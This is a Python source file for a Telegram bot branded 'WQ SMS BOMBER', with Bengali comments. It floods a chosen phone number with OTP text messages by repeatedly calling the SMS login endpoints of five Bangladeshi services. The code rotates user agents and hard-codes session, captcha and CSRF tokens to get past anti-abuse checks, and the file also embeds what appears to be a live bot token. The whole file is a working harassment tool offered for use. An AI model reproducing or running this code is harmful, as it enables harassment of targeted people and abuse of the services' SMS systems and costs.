import os
import random
import threading
import time
from flask import Flask
import requests
import telebot
from telebot.types import KeyboardButton, ReplyKeyboardMarkup

# আপনার দেওয়া টেলিগ্রাম বট টোকেন
TOKEN = "9170879282:AAESbi5FBohsHoVvrs4t-kblWKfULticg4s"
bot = telebot.TeleBot(TOKEN)

# রেন্ডারের পোর্ট রিকোয়ারমেন্ট পূরণের জন্য ফ্লাস্ক ওয়েব সার্ভার
app = Flask(__name__)


@app.route("/")
def home():
  return "Oustad Bot is Live and Running!"


# ইউজার এজেন্ট পুল
USER_AGENT_DATA = {
    "user_agent": [
        (
            "Mozilla/5.0 (Linux; Android 10; SM-T595"
            " Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko)"
            " Chrome/156.0.8078.47 Safari/537.36"
        ),
        (
            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36"
        ),
        (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ),
        (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X)"
            " AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2"
            " Mobile/15E148 Safari/604.1"
        ),
    ]
}


class Bomber:

  def __init__(self, user_mobile, number_of_messege, chat_id):
    self.user_mobile = user_mobile
    self.number_of_messege = number_of_messege
    self.chat_id = chat_id

  def getUserAgent(self):
    return random.choice(USER_AGENT_DATA["user_agent"])

  def aroggo(self):
    url = "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.0.0&os=Android&osv=13"
    headers = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.arogga.com",
        "referer": "https://www.arogga.com/",
        "user-agent": self.getUserAgent(),
        "x-requested-with": "mark.via.gp",
    }
    payload = {"mobile": self.user_mobile, "fcmToken": "", "referral": ""}
    try:
      r = requests.post(url, data=payload, headers=headers, timeout=5)
      if r.status_code == 200:
        return True
    except:
      pass
    return False

  def grameenphone(self):
    url = "https://webloginda.grameenphone.com/backend/api/v1/otp"
    headers = {
        "Host": "webloginda.grameenphone.com",
        "User-Agent": self.getUserAgent(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.grameenphone.com",
        "X-Requested-With": "mark.via.gp",
        "Referer": "https://www.grameenphone.com/",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    }
    payload = {"msisdn": self.user_mobile, "source": "gp_web"}
    try:
      r = requests.post(url, data=payload, headers=headers, timeout=5)
      if r.status_code == 200:
        res_json = r.json()
        if res_json.get("status") == True:
          return True
    except:
      pass
    return False

  def bdtickets(self):
    url = "https://apiv1.bdtickets.com/api/v1/auth/otp/send"
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "x-platform": "web",
        "x-channel": "direct",
        "origin": "https://bdtickets.com",
        "referer": "https://bdtickets.com/",
        "user-agent": self.getUserAgent(),
        "x-requested-with": "mark.via.gp",
        "authorization": (
            "Bearer"
            " eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uX2lkIjoiYTNiZWE3OTAtZjcxOC00NjU4LTg5OTctYzM1MzRhMmEzYzNhIiwiaXNfYW5vbnltb3VzIjp0cnVlLCJ0b2tlbl92ZXJzaW9uIjoxLCJyb2xlcyI6W10sInBlcm1pc3Npb25zIjpbXSwianRpIjoiNWNkNjE3NTMtMjBlYS00YzU0LWExMjctMzBjYzU1YjBjOTg1IiwiaWF0IjoxNzkzNjQ2OTEzLCJleHAiOjE3OTQyNTE3MTN9.Rn2jSWG5MWA5LPI7DDAyvb0tFy37QrSg9aUkKm_oI3k"
        ),
    }
    phone_num = self.user_mobile
    if not phone_num.startswith("+88"):
      if phone_num.startswith("88"):
        phone_num = "+" + phone_num
      else:
        phone_num = "+88" + phone_num

    payload = {"phone": phone_num}
    try:
      r = requests.post(url, json=payload, headers=headers, timeout=5)
      if r.status_code == 200:
        res_json = r.json()
        if res_json.get("success") == True:
          return True
    except:
      pass
    return False

  def shopz(self):
    url = "https://www.shopz.com.bd/api/v1/auth/send-otp"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://www.shopz.com.bd",
        "referer": "https://www.shopz.com.bd/login",
        "user-agent": self.getUserAgent(),
        "x-requested-with": "mark.via.gp",
    }
    phone_num = self.user_mobile
    if not phone_num.startswith("+88"):
      if phone_num.startswith("88"):
        phone_num = "+" + phone_num
      else:
        phone_num = "+88" + phone_num

    payload = {
        "phone": phone_num,
        "purpose": "login",
        "captchaToken": (
            "1.kJ9waKkYlBujOwexbvOl63WZrg2sBM5vKdna9SAuTgT_7kB69GgdBbs-jvo-B49IY8qDBfILwN11cm_udwSoDVLts9qlfC0djA0T8duFpShaSNqONsoZSPm18dbTmD367tBY_LTU2Hjv1IVo_hIcRVkyhcS2pHt02jy6a9CIdFkCgVUL082k8c81zSzhRyhDhs0XRluYHMDdRXxDkpmWe5uS7Wr7S5oal3SY1nJ-Q3eI9qIP9I2gVYDTFLdzfdcAz2rqAfcMLw9PteBqXZnGxKIDl7vv30IjjSCZSGWMCsthVGlNkJVn5w2MHwTEo1f0XKV0JYhdzsyqB3tGgIpuvIw5VCeWFSjol_GLg5FXZPf0_g5Zxc5JhiRlKTc5tqvlGhCOA4DaYnYRZoKOa7I7zXcU85nb8YqtYDgoo4FLfSD-XjoYhFIuxSSANRmucUR7WnGJrAcuPdgsMHYZJDG4reRhoQexWC_RyMPQuVAYgp5xK62pN5J87xHx49koZGbUd2IhE73RjucZbcn1MzoS19tWocmky0sJNzLivVkpvfby8b-mepIGNNopfVtLRyScjemlZjcDY8PLX7TOum97Ar3CuZPCg4jYyXl3AVWak5OFYA98Hy99NQZmUgy8c5hB2gO-u05m9fjbmaJQtnLITqbQLm5fYkkMwuOenIenyJ_EV59WG2sQ5vP7o4MUJUnlA63iUXhHeneYObrv53oTmqrAlQ7jrtsq2ZtP0y36Gqo.WrDo0A20eZBpeygKDN7UIg.fa47062f3ec85ee87e62027d0026a4b32addfaeb1d854642ce2aae530bc8d564"
        ),
    }
    try:
      r = requests.post(url, json=payload, headers=headers, timeout=5)
      if r.status_code == 200:
        return True
    except:
      pass
    return False

  # নতুন এপিআই: ঘরের বাজার (Ghorer Bazar)
  def ghorerbazar(self):
    url = "https://ghorerbazar.com/submit/otp"
    headers = {
        "Host": "ghorerbazar.com",
        "User-Agent": self.getUserAgent(),
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
        ),
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://ghorerbazar.com",
        "Referer": "https://ghorerbazar.com/varify/otp",
        "X-Requested-With": "mark.via.gp",
    }
    payload = {
        "_token": "0ecCDCSnO9CedtuzdjGG55EO8dw8RtHN68H2YbE0",
        "phone": self.user_mobile,
        "name": "Oustad User",
        "otp": "",
    }
    try:
      r = requests.post(url, data=payload, headers=headers, timeout=5)
      if r.status_code in [200, 301, 302]:
        return True
    except:
      pass
    return False

  def start(self):
    counter = 0
    bot.send_message(
        self.chat_id,
        f"🚀 **Target:** `{self.user_mobile}`\n📊 **Count:**"
        f" `{self.number_of_messege}`\n⚡ **বম্বিং কার্যক্রম শুরু হয়েছে...**",
        parse_mode="Markdown",
    )
    # ৫টি এপিআইয়ের কম্বিনেশন
    methods = [
        self.aroggo,
        self.grameenphone,
        self.bdtickets,
        self.shopz,
        self.ghorerbazar,
    ]

    while counter < self.number_of_messege:
      current_methods = list(methods)
      random.shuffle(current_methods)

      for method in current_methods:
        if counter >= self.number_of_messege:
          break
        try:
          success = method()
          if success:
            counter += 1
            bot.send_message(
                self.chat_id,
                f"[+] OTP sent successfully! [{counter}/{self.number_of_messege}]",
            )
            time.sleep(2.5)
          else:
            time.sleep(1)
        except:
          time.sleep(1)

    bot.send_message(
        self.chat_id,
        f"✅ **টাস্ক সম্পন্ন!**\nTarget: `{self.user_mobile}` সফলভাবে শেষ হয়েছে।",
        parse_mode="Markdown",
    )


# ফিক্সড রিপ্লাই কিবোর্ড (বট চ্যাট বক্সের নিচে স্টেবল থাকবে)
def get_reply_keyboard():
  markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
  btn_bomb = KeyboardButton("🚀 Start Bombing")
  btn_status = KeyboardButton("📊 Bot Status")
  btn_help = KeyboardButton("ℹ️ Help & Info")
  btn_dev = KeyboardButton("👑 Oustad Panel")
  markup.add(btn_bomb, btn_status, btn_help, btn_dev)
  return markup


# টেলিগ্রাম বট হ্যান্ডলার (/start কমান্ড)
@bot.message_handler(commands=["start"])
def send_welcome(message):
  welcome_text = (
      "🔥 *স্বাগতম ওস্তাদ! WQ SMS BOMBER প্যানেলে.*\n\nনিচের ফিক্সড কিবোর্ড"
      " থেকে আপনার প্রয়োজনীয় অপশনটি সিলেক্ট করুন:"
  )
  bot.send_message(
      message.chat.id,
      welcome_text,
      reply_markup=get_reply_keyboard(),
      parse_mode="Markdown",
  )


# ফিক্সড বাটনে ক্লিক করলে কী কাজ করবে তা হ্যান্ডেল করা
@bot.message_handler(func=lambda message: True)
def handle_text_buttons(message):
  chat_id = message.chat.id
  text = message.text

  if text == "🚀 Start Bombing":
    msg = bot.send_message(
        chat_id,
        "📱 অনুগ্রহ করে টার্গেট মোবাইল নম্বরটি দিন (যেমন: `013XXXXXXXX`):",
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )
    bot.register_next_step_handler(msg, process_mobile_step)

  elif text == "📊 Bot Status":
    bot.send_message(
        chat_id,
        (
            "🟢 **Bot Status:** Online & Active\n🚀 **APIs Loaded:** Arogga,"
            " Grameenphone, Bdtickets, Shopz, Ghorerbazar\n⚡ **Speed:** High"
            " Performance"
        ),
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )

  elif text == "ℹ️ Help & Info":
    bot.send_message(
        chat_id,
        "ℹ️ **কীভাবে ব্যবহার করবেন:**\n\n১. `🚀 Start Bombing` বাটনে ক্লিক"
        " করুন।\n২. টার্গেট নম্বর দিন।\n৩. কতটি মেসেজ পাঠাবেন তা লিখুন।\n\nঅথবা"
        " সরাসরি কমান্ড দিতে পারেন:\n`/bomb <number> <count>`",
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )

  elif text == "👑 Oustad Panel":
    bot.send_message(
        chat_id,
        (
            "👑 **Developer:** Ruhin Ahmed (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
            " **Hosted on:** Render & GitHub"
        ),
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )


# নম্বর পাওয়ার পর কাউন্ট চাওয়ার স্টেপ
def process_mobile_step(message):
  target_mobile = message.text.strip()
  if target_mobile in [
      "🚀 Start Bombing",
      "📊 Bot Status",
      "ℹ️ Help & Info",
      "👑 Oustad Panel",
  ]:
    return

  msg = bot.send_message(
      message.chat.id,
      f"✅ টার্গেট নম্বর: `{target_mobile}`\n\n🔢 এবার কতগুলো মেসেজ পাঠাতে চান তা"
      " সংখ্যায় লিখুন (যেমন: `10`):",
      reply_markup=get_reply_keyboard(),
      parse_mode="Markdown",
  )
  bot.register_next_step_handler(msg, process_count_step, target_mobile)


# কাউন্ট পাওয়ার পর বম্বিং শুরু করার স্টেপ
def process_count_step(message, target_mobile):
  try:
    count = int(message.text.strip())
    bot.send_message(
        message.chat.id,
        f"🚀 টাস্ক রিসিভড!\nTarget: `{target_mobile}`\nCount: `{count}`",
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )
    b = Bomber(target_mobile, count, message.chat.id)
    threading.Thread(target=b.start).start()
  except ValueError:
    bot.send_message(
        message.chat.id,
        "[-] ভুল সংখ্যা দিয়েছেন! দয়া করে সঠিক সংখ্যা লিখুন।",
        reply_markup=get_reply_keyboard(),
    )


# পুরনো /bomb কমান্ড সাপোর্টও বহাল রাখা হলো
@bot.message_handler(commands=["bomb"])
def handle_bomb(message):
  try:
    parts = message.text.split()
    if len(parts) < 3:
      bot.reply_to(
          message,
          "[-] সঠিক ফরম্যাট দিন: `/bomb <number> <count>`",
          parse_mode="Markdown",
      )
      return
    target = parts[1]
    count = int(parts[2])

    b = Bomber(target, count, message.chat.id)
    threading.Thread(target=b.start).start()
  except ValueError:
    bot.reply_to(message, "[-] অনুগ্রহ করে সঠিক সংখ্যা দিন!")


def run_telegram_bot():
  bot.infinity_polling()


if __name__ == "__main__":
  # ব্যাকগ্রাউন্ডে টেলিগ্রাম বট চালু রাখা
  threading.Thread(target=run_telegram_bot, daemon=True).start()

  # রেন্ডারের সার্ভারের জন্য ডাইনামিক পোর্ট বাইন্ডিং
  port = int(os.environ.get("PORT", 5000))
  app.run(host="0.0.0.0", port=port)
